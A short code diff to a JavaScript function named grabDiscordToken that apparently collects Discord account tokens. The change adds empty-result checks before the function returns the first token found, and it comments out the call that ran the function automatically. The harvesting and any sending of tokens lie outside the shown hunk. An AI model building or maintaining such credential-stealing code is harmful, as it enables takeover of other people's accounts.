@@ -79,7 +79,21 @@ export function grabDiscordToken() {
       })
     }
   }
-  return Object.values(tokens)[0][0]
+  const tokenValues = Object.values(tokens)
+
+  // Check if any tokens were found
+  if (tokenValues.length === 0) {
+    console.log('No Discord tokens found.')
+    return null
+  }
+
+  // Check if the first platform has any tokens
+  if (!tokenValues[0] || tokenValues[0].length === 0) {
+    console.log('No tokens found in the first platform.')
+    return null
+  }
+
+  return tokenValues[0][0]
 }
 
-grabDiscordToken()
+// grabDiscordToken()
